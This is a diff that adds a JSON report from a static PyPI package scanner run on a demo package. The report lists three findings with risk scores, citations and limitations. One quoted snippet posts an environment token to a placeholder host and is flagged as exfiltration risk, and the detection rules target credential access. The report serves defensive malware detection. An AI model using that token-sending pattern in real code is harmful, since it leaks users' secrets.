@@ -1,0 +1,124 @@
+{
+  "project": {
+    "name": "PyPi-AI",
+    "version": "0.1.0",
+    "developers": [
+      {
+        "name": "VASANTH ADITHYA",
+        "roll": "160123749049",
+        "email": "vasanthfeb13@gmail.com"
+      },
+      {
+        "name": "SAI GEETHIKA",
+        "roll": "160123749302",
+        "email": "yedlasaigeethika37@gmail.com"
+      }
+    ],
+    "safety": "Static-only scanner; never executes untrusted package code."
+  },
+  "summary": {
+    "target": "examples/safe_packages/env_network",
+    "input_type": "folder",
+    "files_scanned": 1,
+    "packages_scanned": 1,
+    "total_findings": 3
+  },
+  "risk": {
+    "score": 45,
+    "level": "medium",
+    "breakdown": {
+      "credential-access": 30,
+      "network": 15
+    }
+  },
+  "findings": [
+    {
+      "finding_id": "F001",
+      "rule_id": "PY001_ENV_ACCESS",
+      "severity": "medium",
+      "category": "credential-access",
+      "file_path": "env_network_demo/__init__.py",
+      "line_start": 7,
+      "line_end": 7,
+      "snippet": "token = os.environ.get(\"DEMO_TOKEN\")",
+      "message": "Environment variable access was detected.",
+      "confidence": 0.85,
+      "tags": [
+        "credentials",
+        "environment"
+      ],
+      "citations": [
+        "CHASE"
+      ],
+      "package_name": "env-network-demo",
+      "package_version": "0.1.0"
+    },
+    {
+      "finding_id": "F002",
+      "rule_id": "PY001_ENV_ACCESS",
+      "severity": "medium",
+      "category": "credential-access",
+      "file_path": "env_network_demo/__init__.py",
+      "line_start": 12,
+      "line_end": 12,
+      "snippet": "token = os.environ.get(\"DEMO_TOKEN\")",
+      "message": "Environment variable access was detected.",
+      "confidence": 0.85,
+      "tags": [
+        "credentials",
+        "environment"
+      ],
+      "citations": [
+        "CHASE"
+      ],
+      "package_name": "env-network-demo",
+      "package_version": "0.1.0"
+    },
+    {
+      "finding_id": "F003",
+      "rule_id": "PY003_NETWORK_CLIENT",
+      "severity": "medium",
+      "category": "network",
+      "file_path": "env_network_demo/__init__.py",
+      "line_start": 13,
+      "line_end": 13,
+      "snippet": "requests.post(\"https://example.invalid/demo\", data={\"token\": token})",
+      "message": "Network client behavior was detected.",
+      "confidence": 0.85,
+      "tags": [
+        "network",
+        "exfiltration-risk"
+      ],
+      "citations": [
+        "CHASE"
+      ],
+      "package_name": "env-network-demo",
+      "package_version": "0.1.0"
+    }
+  ],
+  "scan_plan": {
+    "target": "examples/safe_packages/env_network",
+    "input_type": "folder",
+    "files_discovered": 1,
+    "safety_notes": [
+      "No package code is installed, imported, or executed.",
+      "Archives are extracted into temporary scanner-owned directories."
+    ]
+  },
+  "rule_trace": [],
+  "citations": {
+    "CHASE": "Toda, T. and Mori, T. CHASE: LLM Agents for Dissecting Malicious PyPI Packages. 2025 IEEE/ACM AIware.",
+    "PYPA_SDIST": "PyPA source distribution format specification.",
+    "PYPA_WHEEL": "PyPA binary distribution wheel format specification.",
+    "PYTHON_TARFILE": "Python tarfile extraction filters documentation.",
+    "GEMINI": "Google Gemini API structured output documentation.",
+    "OLLAMA": "Ollama API and cloud documentation.",
+    "OSV": "OSV.dev public vulnerability database and API for open-source packages.",
+    "MALWARE_EXAMPLES": "Public reports and datasets from Datadog, Unit42, Fortinet, and ReversingLabs for package-name examples only."
+  },
+  "limitations": [
+    "Static analysis can miss behavior generated at runtime.",
+    "The scanner never executes package code, so it cannot observe live network or process behavior.",
+    "AI explanations are summaries of evidence and are not independent proof."
+  ]
+}
